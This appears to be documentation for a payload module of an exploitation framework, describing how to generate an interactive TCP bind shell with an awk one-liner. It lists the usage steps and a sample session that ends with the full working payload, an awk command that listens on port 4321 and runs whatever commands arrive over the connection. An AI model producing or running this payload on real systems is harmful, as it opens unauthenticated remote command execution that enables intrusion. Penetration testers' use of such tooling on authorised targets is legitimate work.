## Description

Module generates payload that creates interactive tcp bind shell by using awk one-liner. 

## Verification Steps

  1. Start `./exf.py`
  2. Do: `use payloads/cmd/awk_bind_tcp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates awk tcp bind shell payload.

## Scenarios

```
exf > use payloads/cmd/awk_bind_tcp
exf (Awk Bind TCP) > set rport 4321
[+] rport => 4321
exf (Awk Bind TCP) > run
[*] Running module...
[*] Generating payload
awk 'BEGIN{s="/inet/tcp/4321/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```
